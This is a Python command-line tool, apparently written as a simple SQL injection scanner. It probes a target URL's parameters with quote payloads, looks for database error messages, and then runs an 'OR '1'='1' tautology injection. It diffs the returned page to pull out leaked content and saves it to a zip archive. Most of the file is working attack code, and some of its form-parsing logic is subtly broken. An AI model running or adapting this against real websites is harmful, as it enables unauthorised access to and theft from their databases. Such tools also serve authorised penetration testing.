import os
from urllib import parse

import requests
import argparse
from difflib import Differ
import zipfile

from bs4 import BeautifulSoup

possible_payload = ["'", "\"", "`", "\\", "/*'*/", ")'"]
error_messages = ["You have an error in your SQL syntax",
                  "ODBC Microsoft Access Driver",
                  "MySQL syntax error"]

result = []


def find_first_pos(line):
    x = 0
    white_space = "\t\n\r\t\f "
    for letter in line:
        if white_space.find(letter) != -1:
            x = x + 1
            continue
        return x + 1


def find_potential_vector(url, method):
    result_vec = []
    parsed_url = parse.urlparse(url)
    result_vec.append(parsed_url.query[0:parsed_url.query.find('=')])
    base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
    r = requests.get(base_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    for form in soup.find_all('form'):
        if not form.has_attr(method):
            continue
        for input_html in form.find_all("input"):
            if input_html.has_attr('name'):
                result_vec.append('name')
    result_vec = set(result_vec)
    for vector in result_vec:
        print(vector)
    return result_vec, base_url


def test_vector_potential(based_url, vector):
    for pld in possible_payload:
        url = based_url + '?' + vector + '=' + pld
        r = requests.get(url)
        print('Status code:', r.status_code)
        if r.status_code != 200:
            print('Error request')
            return None
        for error in error_messages:
            if error in r.text:
                print(f'Error detected. Potential SQL injection found! Message: {error}')
                return pld
    print("Cannot detect error based injection")
    return None


def or_based_injection(base_url, vector, payload):
    r = requests.get(base_url)
    old_html = r.text.splitlines(keepends=True)
    r = requests.get(base_url + '?' + vector + '=foo' + payload + "OR '1' = '1")
    new_html = r.text.splitlines(keepends=True)
    if not old_html != new_html:
        print('Or based injection failed')
        return None
    diff_inst = Differ()
    deltas = list(diff_inst.compare(old_html, new_html))
    for line in deltas:
        if line.startswith('+') and not line[1:].isspace():
            pos = find_first_pos(line[1:])
            result.append(line[pos:])


def perform_get(vectors, base_url):
    for vector in vectors:
        payload = test_vector_potential(base_url, vector)
        if payload:
            or_based_injection(base_url, vector, payload)
            # union_bases_inject(base_url, vector, payload)
            pass


def write_result(archive_file):
    with open("result.txt", 'w') as f:
        for line in result:
            f.write(line)
    if not archive_file.endswith('.zip'):
        zip_file = archive_file + '.zip'
    else:
        zip_file = archive_file
    with zipfile.ZipFile(zip_file, 'w') as zipf:
        zipf.write("result.txt")
    os.unlink("result.txt")


def detect_sql_injection(url, method, archive_file):
    if method == "GET":
        vector, base_url = find_potential_vector(url, method)
        print('Found ' + str(len(vector)) + ' potential vectors')
        perform_get(vector, base_url)
    write_result(archive_file)

def main():
    parser = argparse.ArgumentParser(description='Detect SQL Injection vulnerabilities.')
    parser.add_argument('URL', type=str, help='URL to test against.')
    parser.add_argument('-o', metavar='archive', type=str, help='Archive file for storage.',
                        default="default_archive")
    parser.add_argument('-X', metavar='request', type=str, help='Type of request (GET/POST).', default="GET")

    args = parser.parse_args()

    detect_sql_injection(args.URL, args.X, args.o)


if __name__ == "__main__":
    main()
